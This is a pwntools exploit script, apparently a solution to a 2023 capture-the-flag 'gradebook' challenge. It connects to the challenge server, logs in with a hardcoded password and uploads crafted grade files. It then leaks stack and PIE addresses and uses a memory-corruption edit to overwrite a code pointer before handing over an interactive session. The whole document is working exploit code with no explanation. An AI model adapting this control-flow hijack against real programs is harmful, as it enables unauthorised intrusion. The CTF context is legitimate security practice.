from pwn import *
# 
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./chal')
p = remote("gradebook.2023.ctfcompetition.com",1337)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
def login():
    sla(b":\n",b"pencil".ljust(0x30,b'\0'))
def cmd(c):
    sla(b"QUIT\n\n",str(c).encode())
def show(c):
    cmd(1)
    sla(b":\n",c)
def create(name,c):
    cmd(2)
    sla(b":\n",name)
    sla(b":\n",str(len(c)).encode())
    sa(b":\n",c)
def grade(filesize=0x200,start=0,cur_end=0x100,FirstName=b"y0un9",LastName=b"n132",num=0):
    magic = b"G\0\0\0"
    num = p32(num)
    return magic+num+LastName.ljust(0x20,b'\0')+FirstName.ljust(0x20,b'\0')+flat([filesize,start,cur_end])
def given():
    with open("gradebook",'rb') as f:
        return f.read() 
def edit(idx=1,grade=b"\xff\xff"):
    cmd(2)
    sla(b":\n",str(idx).encode())
    sla(b":\n",grade)
def course(class_id=b"",title=b"",grade=b"",teacher=b"",room=b"",period=0,):
    return b""+\
        class_id.ljust(8,b'\0')+\
        title.ljust(22,b'\0')+\
        grade.ljust(2,b'\0')+\
        teacher.ljust(12,b'\0')+\
        room.ljust(4,b'\0')+\
        p64(period)
def add(data):
    cmd(1) 
    sla(b":\n",data[:8])
    sla(b":\n",data[8:30])
    sla(b':\n',data[30:32])
    sla(b':\n',data[32:44])
    sla(b':\n',data[44:48])
    sla(b':\n',str(u64(data[48:56])).encode())
    
    
def atk(pay,debug=False):
    filesize = 0x800
    create(b"/tmp/grades_"+b"2"*0x20,(grade(filesize,start=0x58-0x1e)+course()).ljust(filesize,b'\0'))
    show(b"/tmp/grades_"+b"2"*0x20)
    context.log_level=20
    edit(1,p16(0x48))
    if debug:
        gdb.attach(p,'''
        b * 0x5555555562f2
        # b *0x555555555BBA
        # b *0x555555555E4B
        # b *0x555555555E2D
        ''')
    add(pay.ljust(0x38,b'\0'))
def leak():
    create(b"/tmp/grades_"+b"1"*0x20,given())
    show(b"/tmp/grades_"+b"1"*0x20)
    add(b''.ljust(0x38,b'A'))
    ru(b' AAAA     ')
    base = u64(ru(b"\n")[:-1]+b'\0\0')
    info(hex(base))
    cmd(5)
    return base
login()

stack  = leak()

atk(flat([0xffffffffffffffff,0x100,stack-0x00004752ade50000+0x38]))
ru(b"\x94\n")
ru(b"\n   ")
# 
# add(flat([0x1]*0x7))
PIE = u64(ru(b"pencil")[:6]+b'\0\0')-0x2386
info(hex(PIE))
cmd(5)
target =  0x5555555556f3-0x0000555555554000+PIE
atk(flat([0xffffffffffffffff,0x100,stack-0x00004752ade50000+0x38-0x1e]),False)
context.log_level='debug'
edit(2,p64(target)[:2])
info(p.readline().decode())
input()
p.interactive()